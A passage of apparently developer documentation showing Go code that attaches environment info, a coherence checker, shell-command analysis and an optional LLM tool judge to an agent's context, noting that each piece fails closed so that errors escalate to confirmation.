ctx = tools.WithEnvInfo(ctx, envInfo)
ctx = tools.WithCoherence(ctx, myCoherenceChecker)   // may be omitted in single-session runs

// Shell tools: attach the deterministic analysis once per call (a per-call
// context — the analysis depends on the command input, not the session).
analysis, analyzeErr := tools.AnalyzeShellCommandForJudge(ctx, toolName, input)
ctx = tools.WithShellAnalysis(ctx, analysis, analyzeErr) // an attached error degrades judges safely

// Optional centralized LLM judge (nil-safe when unconfigured).
judge := tools.NewToolJudgeFromConfig(judgeCfg, logger)
if judge != nil {
    judge.SetIsInternalFn(isInternalTool) // fast-path framework tools
}

// The executor and file tools now pick up EnvInfo and Coherence from ctx;
// the ToolJudge is consulted by the layer that owns mutation gating.
```

Every function here is **fail-closed or nil-safe**: a missing checker, a `nil` `EnvInfo`, or a judge LLM error never widens what auto-approves — it either no-ops or escalates to confirmation.
